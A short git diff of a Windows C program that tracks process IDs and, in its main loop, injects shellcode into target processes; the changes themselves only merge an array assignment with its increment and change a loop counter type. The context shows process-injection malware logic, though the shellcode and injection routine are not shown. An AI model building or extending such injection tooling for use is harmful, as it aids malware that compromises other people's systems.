@@ -41,8 +41,7 @@ void add_pid(pMap *a, DWORD pid) {
     else {
         a->targeted = malloc(sizeof(DWORD));
     }
-    a->targeted[a->targeted_size] = pid;
-    a->targeted_size++;
+    a->targeted[a->targeted_size++] = pid;
 }
 
 // Function to check whether pid evaluates to true or if pid has already been targeted/inside "targeted" array.
@@ -166,7 +165,7 @@ int main() {
     CreateThread(0, 0, free_pids, &a, 0, 0);
 
     while (true) {
-        for (size_t i=0; i<MAX_TARGETS; i++) {
+        for (int i=0; i<MAX_TARGETS; i++) {
             if (check_pid(&a, a.pids[i])) {
                 inject(shellcode, sizeof(shellcode), a.pids[i]);
                 add_pid(&a, a.pids[i]);
